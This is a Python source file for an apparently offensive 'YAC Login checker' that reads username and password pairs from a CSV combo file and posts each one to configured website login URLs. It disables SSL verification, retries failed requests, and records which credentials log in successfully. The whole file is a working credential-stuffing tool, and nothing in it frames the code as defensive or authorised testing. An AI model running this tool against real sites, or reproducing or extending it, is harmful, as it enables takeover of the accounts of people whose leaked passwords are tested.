import time
import csv
import requests
from yac.utils import vparser
import logging
import os
import argparse
from datetime import datetime
from urllib.parse import unquote
import urllib3

# Globals
running = True
results = []

def reverse_url_encoding(encoded_url):
    decoded_url = unquote(encoded_url)
    return decoded_url

def setup_logging(log_file):
    log_dir = os.path.join('logs', datetime.now().strftime('%Y-%m-%d'))
    os.makedirs(log_dir, exist_ok=True)

    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s',
                        handlers=[logging.FileHandler(os.path.join(log_dir, log_file)),
                                  logging.StreamHandler()])

def perform_login(username, password, website_info, success_indicators, failure_indicators, max_retries=3):
    for attempt in range(max_retries):
        try:
            if not running:
                return False, "Paused"

            payload = {'username': username, 'password': password}
            payload.update(website_info['payload'])

            headers = website_info['headers']
            
            # Set a timeout for the request
            timeout = 30  # 30 seconds
            
            # Disable SSL verification warnings
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            response = requests.post(
                reverse_url_encoding(website_info['website']['login_url']), 
                data=payload, 
                headers=headers, 
                timeout=timeout,
                verify=False  # Disable SSL verification
            )

            if response.status_code == 302:
                logging.info("Received a 302 redirection response.")

                for indicator in success_indicators:
                    if indicator in response.text:
                        logging.info(f"Login successful for username: {username}")
                        return True, "Success"
                for indicator in failure_indicators:
                    if indicator in response.text:
                        logging.error(f"Login failed for username: {username}. Reason: {indicator}")
                        return False, indicator
                logging.error(f"Login failed for username: {username}. Reason: {response.status_code}")
                return False, "Unknown"

            elif response.status_code == 200:
                for indicator in success_indicators:
                    if indicator in response.text:
                        logging.info(f"Login successful for username: {username}")
                        return True, "Success"
                for indicator in failure_indicators:
                    if indicator in response.text:
                        logging.error(f"Login failed for username: {username}. Reason: {indicator}")
                        return False, indicator
                logging.error(f"Login failed for username: {username}. Reason: Unknown")
                return False, "Unknown"

            else:
                logging.error(f"Login request failed with status code: {response.status_code}")
                return False, f"Status Code {response.status_code}"

        except requests.exceptions.Timeout:
            logging.warning(f"Request timed out for username: {username}. Attempt {attempt + 1} of {max_retries}")
            if attempt == max_retries - 1:
                return False, "Request timed out"
        except requests.exceptions.ConnectionError as e:
            logging.warning(f"Connection error occurred for username: {username}: {str(e)}. Attempt {attempt + 1} of {max_retries}")
            if attempt == max_retries - 1:
                return False, "Connection error"
        except Exception as e:
            logging.warning(f"Exception occurred during login for username: {username}: {str(e)}. Attempt {attempt + 1} of {max_retries}")
            if attempt == max_retries - 1:
                return False, "Exception occurred"
        
        # Wait before retrying
        time.sleep(2 ** attempt)  # Exponential backoff

    return False, "Max retries reached"

def save_results(results, filename):
    if results:
        with open(filename, 'w', newline='') as csvfile:
            fieldnames = ['Username', 'Password', 'Valid Login', 'Reason']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(results)
            logging.info(f"Results saved to {filename}.")
    else:
        logging.info("No results to save.")

# Function to locate config file in multiple locations
def load_config():
    config_path = os.path.expanduser('~/.yac/config/websites_config.ini')
    if not os.path.exists(config_path):
        raise FileNotFoundError(f"Config file not found at {config_path}")
    
    # Use vparser to read the config file
    return vparser.read_website_config(config_path)

def print_websites(websites):
    for i, (website_name, _) in enumerate(websites.items(), start=1):
        print(f"{i}. {website_name}")

def single_check(websites, website_number, credentials_file, output_file=None):
    website_name, website_info = list(websites.items())[website_number - 1]
    perform_check(website_name, website_info, credentials_file, output_file)

def multiple_check(websites, website_numbers):
    for website_number in website_numbers:
        website_name, website_info = list(websites.items())[website_number - 1]
        perform_check(website_name, website_info)

def perform_check(website_name, website_info, credentials_file=None, output_file=None):
    global results
    # Use the provided output file or fallback to the config file output path
    output_file = output_file if output_file else website_info['website']['output_file']
    success_indicators = website_info['website']['success_indicators']
    failure_indicators = website_info['website']['failure_indicators']

    logging.info(f"Processing website: {website_name}")

    valid_logins = 0
    start_time = time.time()

    # Use the provided credentials file if specified
    if credentials_file:
        try:
            with open(credentials_file, 'r') as file:
                csv_reader = csv.DictReader(file)
                for row in csv_reader:
                    username = row['Username']
                    password = row['Password']
                    login_status, reason = perform_login(username, password, website_info, success_indicators, failure_indicators)
                    results.append({'Username': username, 'Password': password,
                                     'Valid Login': 'Yes' if login_status else 'No',
                                     'Reason': reason})
                    if login_status:
                        valid_logins += 1
        except FileNotFoundError:
            logging.error(f"File '{credentials_file}' not found.")
    else:
        credentials_file = website_info['website']['credentials_file']
        try:
            with open(credentials_file, 'r') as file:
                csv_reader = csv.DictReader(file)
                for row in csv_reader:
                    username = row['Username']
                    password = row['Password']
                    login_status, reason = perform_login(username, password, website_info, success_indicators, failure_indicators)
                    results.append({'Username': username, 'Password': password,
                                     'Valid Login': 'Yes' if login_status else 'No',
                                     'Reason': reason})
                    if login_status:
                        valid_logins += 1
        except FileNotFoundError:
            logging.error(f"File '{credentials_file}' not found.")

    end_time = time.time()

    execution_time = end_time - start_time

    try:
        with open(output_file, 'w', newline='') as csvfile:
            fieldnames = ['Username', 'Password', 'Valid Login', 'Reason']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

            writer.writeheader()
            writer.writerows(results)
            writer.writerow({'Username': "Execution time: %.2f seconds" % execution_time, 'Password': ''})
            writer.writerow({'Username': "Total users: %d" % (len(results)), 'Password': ''})
            writer.writerow({'Username': "Valid logins: %d" % valid_logins, 'Password': ''})
    except PermissionError:
        logging.error(f"No permission to write to '{output_file}'.")

    logging.info("Execution time: %.2f seconds", execution_time)
    logging.info("Total users: %d", len(results))
    logging.info("Valid logins: %d", valid_logins)

def get_config_file():
    home_dir = os.path.expanduser("~")
    config_dir = os.path.join(home_dir, '.yac', 'config')
    config_file = os.path.join(config_dir, 'websites_config.ini')
    return config_file

def main():
    config = load_config()
    parser = argparse.ArgumentParser(description='YAC Login checker')
    parser.add_argument('-c', '--config', action='store_true', help='Print websites in config file')
    parser.add_argument('-s', '--single', type=int, help='Perform single check on website number')
    parser.add_argument('-m', '--multiple', type=lambda s: [int(i) for i in s.split(',')], help='Perform multiple checks on website numbers (separated by comma or space)')
    parser.add_argument('-C', '--combo', type=str, help='Path to credentials file for single check')
    parser.add_argument('-o', '--output', type=str, help='Specify output file for single check')
    args = parser.parse_args()

    log_file = "output.log"
    setup_logging(log_file)

    config_file = get_config_file()
    if not os.path.exists(config_file):
        logging.error(f"Config file not found at {config_file}")
        return

    websites = vparser.read_website_config(config_file)

    if args.config:
        print_websites(websites)
    elif args.single:
        single_check(websites, args.single, args.combo, args.output)
    elif args.multiple:
        multiple_check(websites, args.multiple)
    else:
        print("Invalid arguments. Please use -c, -s or -m.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("KeyboardInterrupt detected. Would you like to save results? (yes/no): ")
        user_input = input().strip().lower()
        if user_input in ['yes', 'y']:
            save_results(results, "results.csv")
            logging.info("Results saved. Exiting program.")
        else:
            logging.info("Results not saved. Exiting program.")
